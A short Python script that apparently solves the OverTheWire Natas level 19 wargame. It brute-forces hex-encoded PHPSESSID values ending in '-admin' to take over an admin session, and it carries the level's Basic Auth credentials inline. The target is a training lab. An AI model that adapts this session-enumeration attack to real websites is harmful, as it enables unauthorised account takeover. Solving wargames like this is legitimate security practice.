import requests
from requests.auth import HTTPBasicAuth
import string


for i in range(641):
    # print (checking)
    payload = { "username": "admin", "password": "bitch" }
    cookie = { "PHPSESSID": "".join([hex(ord(c))[2:] for c in str(i)]) + "2d" + "61646d696e" }
    print ("Checking: " + str(cookie['PHPSESSID']))
    res = requests.post("http://natas19.natas.labs.overthewire.org/?debug=true", data=payload, auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), cookies=cookie)
    # print (res.elapsed.total_seconds())
    
    if ("You are an admin" in res.text):
        print (res.text)
        print(i)
        break
 
       